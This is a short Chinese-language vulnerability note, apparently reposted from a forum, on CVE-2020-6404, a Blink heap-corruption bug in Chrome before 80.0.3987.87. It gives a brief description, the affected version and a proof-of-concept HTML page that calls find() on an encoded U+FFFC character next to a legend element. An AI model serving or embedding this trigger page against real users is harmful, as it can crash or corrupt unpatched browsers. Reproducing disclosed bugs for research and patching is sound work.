# （CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2960](https://www.zhihuifly.com/t/topic/2960)

# （CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞

## 一、漏洞简介

在80.0.3987.87之前的Google Chrome中，Blink中的不当实现使远程攻击者有可能通过精心制作的HTML页面利用堆破坏。

## 二、漏洞影响

Google Chrome 80.0.3987.87

## 三、复现过程

### poc

```
<!DOCTYPE html>
<head>
<script type="text/javascript">
document.addEventListener("DOMContentLoaded", function(){
find(decodeURIComponent('\uFFFC'));
});
</script>
</head>
<body>
<legend></legend>
</body>
</html> 
```

![image](img/d7f0f43f5fa6e31cbdf002b00776d4a5.png)